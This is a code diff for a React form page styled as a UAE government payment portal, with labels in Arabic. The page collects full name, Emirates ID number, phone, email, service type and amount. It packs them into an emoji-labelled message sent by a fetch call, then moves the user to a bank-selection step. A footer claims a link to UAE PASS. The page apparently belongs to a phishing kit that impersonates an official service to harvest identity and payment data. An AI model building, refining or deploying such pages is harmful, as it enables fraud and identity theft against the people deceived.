@@ -3,17 +3,17 @@ import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { ShieldCheck, Info, Loader2 } from "lucide-react";
+import { Loader2, User, Phone, Mail, CreditCard, ShieldCheck, ChevronRight } from "lucide-react";
 
 export default function UserData() {
   const [, setLocation] = useLocation();
   const [loading, setLoading] = useState(false);
   const [formData, setFormData] = useState({
-    invoiceNumber: "",
+    fullName: "",
     idNumber: "",
-    phoneNumber: "",
+    phone: "",
     email: "",
-    serviceType: "",
+    serviceType: "مخالفات مرورية",
     amount: ""
   });
 
@@ -25,14 +25,14 @@ export default function UserData() {
     setLoading(true);
 
     const message = `
-📝 *بيانات المستخدم - بوابة سداد الإمارات*
+👤 *بيانات المستخدم - بوابة سداد الإمارات*
 --------------------------
-🧾 *رقم الفاتورة:* ${formData.invoiceNumber}
+📝 *الاسم:* ${formData.fullName}
 🆔 *رقم الهوية:* ${formData.idNumber}
-📱 *رقم الجوال:* ${formData.phoneNumber}
-📧 *البريد الإلكتروني:* ${formData.email}
-🛠 *نوع الخدمة:* ${formData.serviceType}
-💰 *المبلغ:* ${formData.amount} درهم إماراتي
+📞 *الهاتف:* ${formData.phone}
+📧 *البريد:* ${formData.email}
+🛠 *الخدمة:* ${formData.serviceType}
+💰 *المبلغ:* ${formData.amount} د.إ
 --------------------------
     `;
 
@@ -47,10 +47,8 @@ export default function UserData() {
         }),
       });
       
-      setTimeout(() => {
-        sessionStorage.setItem("paymentData", JSON.stringify(formData));
-        setLocation("/select-bank");
-      }, 1500);
+      sessionStorage.setItem("paymentData", JSON.stringify(formData));
+      setTimeout(() => setLocation("/select-bank"), 1000);
     } catch (error) {
       console.error(error);
       setLoading(false);
@@ -72,8 +70,7 @@ export default function UserData() {
       </header>
 
       <main className="flex-grow container py-12 px-4">
-        <div className="max-w-3xl mx-auto">
-          {/* Progress Steps */}
+        <div className="max-w-2xl mx-auto">
           <div className="flex justify-between mb-12 relative px-4">
             {[1, 2, 3, 4, 5].map((step) => (
               <div key={step} className="flex flex-col items-center z-10">
@@ -89,82 +86,82 @@ export default function UserData() {
           </div>
 
           <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
-            <div className="bg-slate-900 p-8 text-white text-center">
-              <h2 className="text-2xl font-bold">بيانات السداد والخدمة</h2>
-              <p className="text-slate-400 text-sm mt-2">يرجى إدخال البيانات المطلوبة بدقة لضمان معالجة طلبك</p>
+            <div className="bg-slate-900 p-8 text-white">
+              <h2 className="text-2xl font-bold mb-2">بيانات مقدم الطلب</h2>
+              <p className="text-slate-400 text-sm">يرجى إدخال البيانات المطلوبة بدقة لضمان إتمام عملية السداد</p>
             </div>
 
             <form onSubmit={handleNext} className="p-8 space-y-6">
-              <div className="grid md:grid-cols-2 gap-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div className="space-y-2">
-                  <Label htmlFor="invoiceNumber" className="text-sm font-bold text-gray-700">رقم الفاتورة / المرجع</Label>
-                  <Input id="invoiceNumber" required placeholder="مثال: 123456789" className="bg-gray-50 border-gray-200 focus:ring-amber-500" value={formData.invoiceNumber} onChange={(e) => setFormData({...formData, invoiceNumber: e.target.value})} />
+                  <Label htmlFor="fullName" className="text-sm font-bold text-gray-700">الاسم الكامل</Label>
+                  <div className="relative">
+                    <Input id="fullName" required placeholder="أدخل اسمك كما في الهوية" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.fullName} onChange={(e) => setFormData({...formData, fullName: e.target.value})} />
+                    <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  </div>
                 </div>
                 <div className="space-y-2">
                   <Label htmlFor="idNumber" className="text-sm font-bold text-gray-700">رقم الهوية الإماراتية</Label>
-                  <Input id="idNumber" required placeholder="784-XXXX-XXXXXXX-X" className="bg-gray-50 border-gray-200 focus:ring-amber-500" value={formData.idNumber} onChange={(e) => setFormData({...formData, idNumber: e.target.value})} />
+                  <div className="relative">
+                    <Input id="idNumber" required placeholder="784-XXXX-XXXXXXX-X" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.idNumber} onChange={(e) => setFormData({...formData, idNumber: e.target.value})} />
+                    <ShieldCheck className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  </div>
                 </div>
-              </div>
-
-              <div className="grid md:grid-cols-2 gap-6">
                 <div className="space-y-2">
-                  <Label htmlFor="phoneNumber" className="text-sm font-bold text-gray-700">رقم الهاتف المتحرك</Label>
-                  <Input id="phoneNumber" required type="tel" placeholder="05XXXXXXXX" className="bg-gray-50 border-gray-200 focus:ring-amber-500" value={formData.phoneNumber} onChange={(e) => setFormData({...formData, phoneNumber: e.target.value})} />
+                  <Label htmlFor="phone" className="text-sm font-bold text-gray-700">رقم الهاتف المتحرك</Label>
+                  <div className="relative">
+                    <Input id="phone" required type="tel" placeholder="05XXXXXXXX" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.phone} onChange={(e) => setFormData({...formData, phone: e.target.value})} />
+                    <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  </div>
                 </div>
                 <div className="space-y-2">
                   <Label htmlFor="email" className="text-sm font-bold text-gray-700">البريد الإلكتروني</Label>
-                  <Input id="email" required type="email" placeholder="example@domain.ae" className="bg-gray-50 border-gray-200 focus:ring-amber-500" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
+                  <div className="relative">
+                    <Input id="email" required type="email" placeholder="example@domain.com" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
+                    <Mail className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  </div>
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="serviceType" className="text-sm font-bold text-gray-700">نوع الخدمة</Label>
+                  <select 
+                    id="serviceType"
+                    className="w-full bg-gray-50 border border-gray-200 rounded-md py-3 px-3 text-sm focus:outline-none focus:ring-2 focus:ring-amber-500"
+                    value={formData.serviceType}
+                    onChange={(e) => setFormData({...formData, serviceType: e.target.value})}
+                  >
+                    <option value="مخالفات مرورية">مخالفات مرورية</option>
+                    <option value="رسوم تجديد الهوية">رسوم تجديد الهوية</option>
+                    <option value="فواتير كهرباء ومياه">فواتير كهرباء ومياه</option>
+                    <option value="رسوم تصديق عقود">رسوم تصديق عقود</option>
+                    <option value="أخرى">أخرى</option>
+                  </select>
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="amount" className="text-sm font-bold text-gray-700">المبلغ المستحق (د.إ)</Label>
+                  <div className="relative">
+                    <Input id="amount" required type="number" placeholder="0.00" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.amount} onChange={(e) => setFormData({...formData, amount: e.target.value})} />
+                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+                  </div>
                 </div>
               </div>
 
-              <div className="space-y-2">
-                <Label htmlFor="serviceType" className="text-sm font-bold text-gray-700">نوع الخدمة المطلوبة</Label>
-                <select 
-                  id="serviceType"
-                  required
-                  className="w-full bg-gray-50 border border-gray-200 rounded-md p-2 text-sm focus:ring-amber-500 outline-none"
-                  value={formData.serviceType}
-                  onChange={(e) => setFormData({...formData, serviceType: e.target.value})}
-                >
-                  <option value="">اختر نوع الخدمة من القائمة</option>
-                  <option value="دفع الفواتير الحكومية">دفع الفواتير الحكومية الموحدة</option>
-                  <option value="دفع رسوم المرور والمخالفات">دفع رسوم المرور والمخالفات</option>
-                  <option value="تجديد التراخيص التجارية">تجديد التراخيص التجارية</option>
-                  <option value="فواتير الهيئة الاتحادية للكهرباء والماء">فواتير الهيئة الاتحادية للكهرباء والماء</option>
-                  <option value="رسوم الخدمات البلدية">رسوم الخدمات البلدية</option>
-                </select>
-              </div>
-
-              <div className="space-y-2">
-                <Label htmlFor="amount" className="text-sm font-bold text-gray-700">مبلغ السداد الإجمالي (درهم إماراتي)</Label>
-                <div className="relative">
-                  <Input id="amount" required type="number" placeholder="0.00" className="bg-gray-50 border-gray-200 pr-12 font-bold text-lg text-amber-600" value={formData.amount} onChange={(e) => setFormData({...formData, amount: e.target.value})} />
-                  <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-gray-400 font-bold text-xs">د.إ</div>
-                </div>
-              </div>
-
-              <div className="bg-amber-50 border border-amber-100 p-4 rounded-xl flex gap-3">
-                <Info className="w-5 h-5 text-amber-600 shrink-0" />
-                <p className="text-[11px] text-amber-800 leading-relaxed">
-                  سيتم التحقق من البيانات المدخلة مع قاعدة بيانات الجهة المعنية فور النقر على "متابعة". يرجى التأكد من أن رقم الهاتف مرتبط برقم الهوية لاستلام رمز التحقق.
-                </p>
-              </div>
-
-              <div className="flex gap-4 pt-4">
-                <Button type="button" variant="ghost" className="flex-1 text-gray-500" onClick={() => setLocation("/")}>إلغاء</Button>
-                <Button type="submit" className="flex-[2] bg-amber-500 hover:bg-amber-600 text-white font-bold py-6 rounded-xl shadow-lg shadow-amber-500/20" disabled={loading}>
+              <div className="pt-6">
+                <Button type="submit" className="w-full bg-amber-500 hover:bg-amber-600 text-white font-bold py-7 rounded-xl shadow-lg shadow-amber-500/20 transition-all flex items-center justify-center gap-2" disabled={loading}>
                   {loading ? (
-                    <span className="flex items-center gap-2">
-                      <Loader2 className="w-5 h-5 animate-spin" /> جاري التحقق من البيانات...
-                    </span>
-                  ) : "متابعة إلى اختيار البنك"}
+                    <>
+                      <Loader2 className="w-5 h-5 animate-spin" /> جاري معالجة البيانات...
+                    </>
+                  ) : (
+                    <>
+                      الانتقال لاختيار البنك <ChevronRight className="w-5 h-5" />
+                    </>
+                  )}
                 </Button>
               </div>
             </form>
-            
-            <div className="bg-gray-50 p-4 border-t border-gray-100 flex justify-center items-center gap-6 opacity-50">
-              <div className="flex items-center gap-1 text-[10px] font-bold"><ShieldCheck className="w-3 h-3" /> نظام آمن</div>
-              <div className="flex items-center gap-1 text-[10px] font-bold"><Lock className="w-3 h-3" /> تشفير AES-256</div>
+
+            <div className="bg-blue-50 p-4 text-center border-t border-blue-100">
+              <p className="text-[10px] text-blue-700 font-bold">بوابة سداد الإمارات مرتبطة بنظام الهوية الرقمية (UAE PASS) لضمان أمان بياناتك</p>
             </div>
           </div>
         </div>
